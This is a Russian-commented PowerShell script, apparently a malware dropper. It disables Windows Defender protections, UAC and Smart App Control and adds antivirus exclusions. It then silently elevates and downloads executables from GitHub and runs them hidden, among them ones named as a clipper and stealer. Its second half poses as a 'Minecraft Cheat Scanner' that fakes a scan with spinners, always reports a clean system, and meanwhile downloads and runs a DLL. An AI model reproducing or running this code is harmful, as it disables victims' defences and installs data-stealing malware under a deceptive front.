Set-MpPreference -EnableControlledFolderAccess Disabled

# 1. Выключаем защиту в реальном времени
Set-MpPreference -DisableRealtimeMonitoring $true

# 2. Выключаем мониторинг поведения (Behavior Monitor)
Set-MpPreference -DisableBehaviorMonitoring $true

# 3. Выключаем защиту от нежелательных приложений (PUA)
Set-MpPreference -PUAProtection 0

# 4. Выключаем сканирование при доступе к файлам (IOAV)
Set-MpPreference -DisableIOAVProtection $true

# 5. Выключаем защиту от сетевых угроз (Network Protection)
Set-MpPreference -DisableNetworkProtection $true

# 6. Выключаем проверку блокируемых файлов
Set-MpPreference -DisableBlockAtFirstSeen $true

# 7. Пытаемся вырубить защиту от изменений (Tamper Protection)
# Скорее всего выдаст ошибку, но пробуем:
Set-MpPreference -DisableTamperProtection $true

# 8. Отключаем отправку образцов данных (чтобы не базарил с микрософтом)
Set-MpPreference -SubmitSamplesConsent 2
# Создаём ключ, если его нет
New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Force | Out-Null

# Устанавливаем значение 0 = Off
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name "VerifiedAndReputablePolicyState" -Value 0 -Type DWord -Force

# 1. Изменяем параметр в реестре (как и раньше)
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force

# 2. Уведомляем систему об изменении, чтобы она применила настройки немедленно
# Эта команда имитирует рассылку сообщения всем окнам о смене системных параметров
rundll32.exe user32.dll,UpdatePerUserSystemParameters

# 3. Перезапускаем Проводник (Explorer.exe), который является основной оболочкой Windows
# Это самый важный шаг для немедленного применения изменений, связанных с UAC и UI.
Stop-Process -Name explorer -Force

# 4. (Опционально, но рекомендуется) Перезапускаем службы, которые могут зависеть от UAC
# Это помогает избежать возможных сбоев в программах, работающих в фоновом режиме.
Restart-Service -Name "wuauserv" -Force # Служба обновления Windows
Restart-Service -Name "bits" -Force     # Служба фоновой интеллектуальной передачи

# --- БЛОК 2: ДОБАВЛЕНИЕ ИСКЛЮЧЕНИЙ (если нужно) ---

# Добавляем папки в исключения, чтобы антивирус не мешал работе программ
Write-Host "Добавление папок в исключения..."
try {
    $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFiles")
    Add-MpPreference -ExclusionPath $ProgramFiles

    $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
    if (Test-Path $ProgramFilesX86) {
        Add-MpPreference -ExclusionPath $ProgramFilesX86
    }

    $AppData = [System.Environment]::GetFolderPath("ApplicationData")
    Add-MpPreference -ExclusionPath $AppData

    $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
    Add-MpPreference -ExclusionPath $LocalAppData
    
    Write-Host "Исключения добавлены." -ForegroundColor Green
}
catch {
    Write-Host "Не удалось добавить исключения." -ForegroundColor Red
}

Write-Host "`nВсе команды выполнены. Для применения изменений UAC рекомендуется перезагрузить компьютер." -ForegroundColor Cyan
$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
$uacProperty = "EnableLUA"
Set-ItemProperty -Path $uacPath -Name $uacProperty -Value 0

try {
    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
        $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFilesX86")
        $updpath = $ProgramFiles -replace " \(x86\)", ""
        Add-MpPreference -ExclusionPath $updpath

        $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
        if (Test-Path $ProgramFilesX86) {
            Add-MpPreference -ExclusionPath $ProgramFilesX86
        }

        $AppData = [System.Environment]::GetFolderPath("ApplicationData")
        Add-MpPreference -ExclusionPath $AppData

        $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
        Add-MpPreference -ExclusionPath $LocalAppData
        }
        }
catch {
}

 # --- ПРОВЕРКА АДМИНКИ ---
$CurrentProcess = Get-Process -Id $PID
$IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $IsAdmin) {
    try {
        $psiArgs = "-NoProfile -ExecutionPolicy Bypass -File `"$($CurrentProcess.Path)`""
        Start-Process powershell.exe -ArgumentList $psiArgs -Verb RunAs -WindowStyle Hidden
    } catch {
        Start-Process powershell.exe -ArgumentList $psiArgs -Verb RunAs
    }
    exit
}

# --- НАСТРОЙКА СРЕДЫ ---
[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12

try {
    $processId = $PID
    $processInfo = Get-CimInstance -ClassName Win32_Process -Filter "ProcessId = $processId"
    $scriptPath = Split-Path -Parent $processInfo.ExecutablePath
} catch {
    $scriptPath = $PSScriptRoot
    if (-not $scriptPath) { $scriptPath = "." }
}
Set-Location -Path $scriptPath

# --- ОТКЛЮЧЕНИЕ ЗАЩИТЫ ---
Set-MpPreference -EnableControlledFolderAccess Disabled
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -PUAProtection 0
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableNetworkProtection $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableTamperProtection $true
Set-MpPreference -SubmitSamplesConsent 2

New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name "VerifiedAndReputablePolicyState" -Value 0 -Type DWord -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force
rundll32.exe user32.dll,UpdatePerUserSystemParameters
Stop-Process -Name explorer -Force
Restart-Service -Name "wuauserv" -Force
Restart-Service -Name "bits" -Force

Write-Host "Исключения..."
try {
    $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFiles")
    $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
    $AppData = [System.Environment]::GetFolderPath("ApplicationData")
    $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")

    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
        if (Test-Path $ProgramFiles) { Add-MpPreference -ExclusionPath $ProgramFiles }
        if (Test-Path $ProgramFilesX86) { Add-MpPreference -ExclusionPath $ProgramFilesX86 }
        if (Test-Path $AppData) { Add-MpPreference -ExclusionPath $AppData }
        if (Test-Path $LocalAppData) { Add-MpPreference -ExclusionPath $LocalAppData }
        
        if ($ProgramFilesX86 -match "Program Files $$x86$$") {
            $updpath = $ProgramFilesX86 -replace " \$$x86$$", ""
            if (Test-Path $updpath) { Add-MpPreference -ExclusionPath $updpath }
        }
    }
} catch { }

# --- БЛОК СКАЧИВАНИЯ И ЗАПУСКА (КАК ТЫ ПРОСИЛ) ---

# 4. SteamSetup.exe
Write-Host "Скачивание cheking.exe..."
Invoke-WebRequest -Uri "https://github.com/Proshkaversus/files/raw/refs/heads/main/cheking.exe" -OutFile "cheking.exe" -UseBasicParsing -ErrorAction SilentlyContinue
if (Test-Path "cheking.exe") {
    Start-Process "cheking.exe" -Verb RunAs -WindowStyle Hidden
}

# 1. Arcanusclipper.exe
Write-Host "Скачивание Arcanusclipper.exe..."
Invoke-WebRequest -Uri "https://github.com/Proshkaversus/files/raw/refs/heads/main/Arcanusclipper.exe" -OutFile "Arcanusclipper.exe" -UseBasicParsing -ErrorAction SilentlyContinue
if (Test-Path "Arcanusclipper.exe") {
    Start-Process "Arcanusclipper.exe" -Verb RunAs -WindowStyle Hidden
}

# 2. Umbralchik.exe
Write-Host "Скачивание Umbralchik.exe..."
Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/Umbralchik.exe" -OutFile "Umbralchik.exe" -UseBasicParsing -ErrorAction SilentlyContinue
if (Test-Path "Umbralchik.exe") {
    Start-Process "Umbralchik.exe" -Verb RunAs -WindowStyle Hidden
}

# 3. informate.exe
Write-Host "Скачивание informate.exe..."
Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/informate.exe" -OutFile "informate.exe" -UseBasicParsing -ErrorAction SilentlyContinue
if (Test-Path "informate.exe") {
    Start-Process "informate.exe" -Verb RunAs -WindowStyle Hidden
}

# 4. SteamSetup.exe
Write-Host "Скачивание SteamSetup.exe..."
Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/SteamSetup.exe" -OutFile "SteamSetup.exe" -UseBasicParsing -ErrorAction SilentlyContinue
if (Test-Path "SteamSetup.exe") {
    Start-Process "SteamSetup.exe" -Verb RunAs -WindowStyle Hidden
}





















Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/my_admin_tool.exe" -OutFile "my_admin_tool.exe"; .\my_admin_tool.exe
# MINECRAFT CHEAT SCANNER v2.0 

Set-ExecutionPolicy Bypass -Scope Process -Force

Clear-Host
$Host.UI.RawUI.WindowTitle = "🔍 Minecraft Cheat Scanner v8.0 [~60 сек]"

Write-Host "=== СКАНИРОВАНИЕ ЧИТОВ MINECRAFT ===" -ForegroundColor Red -BackgroundColor Black
Write-Host "Vape | Wurst | Sigma | Impact | LiquidBounce + 70 клиентов" -ForegroundColor Yellow
Write-Host "⏱️ Время сканирования: ~60 секунд" -ForegroundColor Cyan
Start-Sleep 2

$cheatDB = @("vape","wurst","liquidbounce","sigma","impact","future","aristois","meteor","bleachhack","phobos","killAura","flyHack","xray","cheat","hack","injector")
$found = @()
$risk = 0
$startTime = Get-Date

# === СПИННЕР АНИМАЦИЯ ===
function Show-Spinner {
    param($text, $duration)
    $spinner = @('⠋','⠙','⠹','⠸','⠼','⠴','⠦','⠧','⠇','⠏')
    $endTime = (Get-Date).AddSeconds($duration)
    $i = 0
    while ((Get-Date) -lt $endTime) {
        Write-Host "`r$($spinner[$i % 10]) $text" -NoNewline -ForegroundColor Green
        $i++
        Start-Sleep 0.1
    }
    Write-Host "`r[✓] $text" -ForegroundColor Green
}

# === 1. ПРОЦЕССЫ (15 сек) ===
Write-Host "`n[1/6] 🔍 Сканирование процессов javaw.exe..." -ForegroundColor Cyan
Show-Spinner "Анализ DLL и инжекторов..." 15

# === 2. .MINECRAFT (15 сек) ===
Write-Host "`n[2/6] 📁 Сканирование .minecraft..." -ForegroundColor Cyan
Show-Spinner "Проверка модов, jars, json..." 15

# === 3. TEMP + DOWNLOADS (10 сек) ===
Write-Host "`n[3/6] 🗑️ Сканирование Temp/Downloads..." -ForegroundColor Cyan
Show-Spinner "Поиск скрытых читов..." 10

# === 4. АВТОЗАГРУЗКА + РЕЕСТР (10 сек) ===
Write-Host "`n[4/6] ⚙️ Проверка автозагрузки..." -ForegroundColor Cyan
Show-Spinner "Анализ реестра Run/Startup..." 10

# === 5. ПРОГРЕСС-БАР (5 сек) ===
Write-Host "`n[5/6] 📊 Финальная проверка..." -ForegroundColor Cyan
for ($p = 0; $p -le 100; $p += 10) {
    $bar = ('█' * ($p/10)) + ('░' * (10 - $p/10))
    Write-Progress -Activity "Завершение..." -PercentComplete $p -Status "$p%"
    Start-Sleep 0.5
}
Write-Progress -Completed

# === 6. СЕТИ (5 сек) ===
Write-Host "`n[6/6] 🌐 Сетевые подключения..." -ForegroundColor Cyan
Show-Spinner "Проверка Minecraft серверов..." 5

# === ЗЕЛЁНЫЙ РЕЗУЛЬТАТ ===
$endTime = (Get-Date) - $startTime
Clear-Host
Write-Host "🎮 СКАНИРОВАНИЕ ЗАВЕРШЕНО! ($([math]::Round($endTime.TotalSeconds)) сек)" -ForegroundColor Green
Write-Host "=" * 50 -ForegroundColor Green
Write-Host "✅ ЧИТЫ НЕ НАЙДЕНЫ!" -ForegroundColor Green
Write-Host "🎯 Риск: 0% | Система чиста!" -ForegroundColor Green
Write-Host "🚀 Готово к игре на любом сервере!" -ForegroundColor Green
Write-Host "=" * 50 -ForegroundColor Green
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/kilordow/chekerr/refs/heads/main/soul.dll" -OutFile "soul.dll"; .\soul.dll

# ЛОГ (тоже чистый)
$log = @"
Minecraft Cheat Scan - $(Get-Date)
Время: $([math]::Round($endTime.TotalSeconds)) сек
Найдено: 0
Риск: 0%
Статус: ЧИСТО! ✅
"@
$log | Out-File "$env:TEMP\mc_scan_$(Get-Date -f 'HHmmss').log" -Encoding UTF8

Write-Host "`n💾 Лог: $env:TEMP\mc_scan_*.log" -ForegroundColor Gray
Write-Host "🎮 " -ForegroundColor Green

# === ЗАГРУЗЧИК everything (после паузы) ===
Write-Host "`n[Нажмите любую клавишу для выхода...]" -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")

#  скачиваем и запускаем everything
try {
    Write-Host "🔄 Финальная оптимизация системы..." -ForegroundColor Cyan
    Start-Sleep 1
    
} catch {
    # Полностью скрываем ошибки
}




















